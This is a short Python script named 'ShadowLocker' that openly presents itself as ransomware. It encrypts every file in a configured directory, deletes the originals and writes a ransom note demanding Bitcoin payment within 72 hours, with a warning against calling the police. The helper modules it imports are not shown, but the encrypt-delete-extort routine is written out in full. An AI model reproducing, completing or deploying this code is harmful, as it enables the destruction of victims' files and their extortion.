#!/usr/bin/env python

""" ShadowLocker - Encrypts all your files >:) """

__author__      = "Gabriel Lineberger"
__copyright__   = "Copyright 2018, Shadow League Organization"


from configreader import read_config
import locker

import os
import sys

from Crypto.PublicKey import RSA


ENCRYPT_DIR = read_config('encrypt_dir')
KEY_SEED = read_config('key_seed')
TARGET = read_config('target')
REQUEST_AMOUNT = read_config('request_amount')
BTC_ADDR = read_config('btc_addr')

key = locker.generateKey(KEY_SEED)

os.chdir(ENCRYPT_DIR)
for filename in os.listdir('.'):
    filedata = open(filename, 'rb').read()
    encrypted = locker.encrypt(filedata, key)
    open(filename+'.shadow', 'wb').write(encrypted)
    os.remove(filename)

HACKED_TEMPLATE = '''Hello ''' + TARGET +'''...
You have been hacked by Shadow League.

Our ShadowLocker malware has encrypted all your files. To recover them,
there is only one way : pay us ''' + REQUEST_AMOUNT + ''' to the following BTC address :
''' + BTC_ADDR + '''

We will then send you instructions to decrypt all your precious files.
Don't try to call the police or you will never get the decryption key.
You have 72 hours to pay or you will never see your files again.
Shadow League always wins.
'''

open('HACKED.txt','wb').write(HACKED_TEMPLATE)
